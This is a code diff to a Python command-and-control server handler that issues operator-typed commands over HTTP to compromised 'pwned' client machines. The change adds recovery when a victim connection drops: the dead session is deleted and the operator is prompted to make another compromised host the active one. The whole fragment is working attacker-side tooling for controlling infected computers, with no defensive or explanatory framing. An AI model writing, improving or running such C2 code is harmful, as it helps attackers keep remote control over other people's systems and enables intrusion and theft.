@@ -35,9 +35,34 @@ class C2Handler(BaseHTTPRequestHandler):
             # interactive session with client
             elif client == pwned_dict[active_session]:
                 cmd = input(f"{client_account}@{client_hostname}: ")
-                self.http_response(HTTPStatusCode.OK.value)
-                # passing back command to client; must be utf-8 encode
-                self.wfile.write(cmd.encode())
+                try:
+                    self.http_response(HTTPStatusCode.OK.value)
+                    # passing back command to client; must be utf-8 encode
+                    self.wfile.write(cmd.encode())
+                except BrokenPipeError as e:
+                    print(f"Lost connection to {pwned_dict[active_session]}.\n")
+                    del pwned_dict[active_session]
+                    # if dict empty, re-init vars to their starting val
+                    if not pwned_dict:
+                        print("Waiting for new connection")
+                        pwned_id = 0
+                        active_session = 1
+                    else:
+                        while True:
+                            # display sessions in dict to switch a new active one.
+                            print(*pwned_dict.items(), sep="\n")
+                            try:
+                                new_session = int(input("\nChoose a session nbr to make active: "))
+                            except ValueError:
+                                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
+                                continue
+                            if new_session in  pwned_dict:
+                                active_session = new_session
+                                print(f"\nActive session is now: {pwned_dict[active_session]}")
+                                break
+                            else:
+                                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
+                                continue
 
             # if client is in pwned_dict but is not our active session
             else:
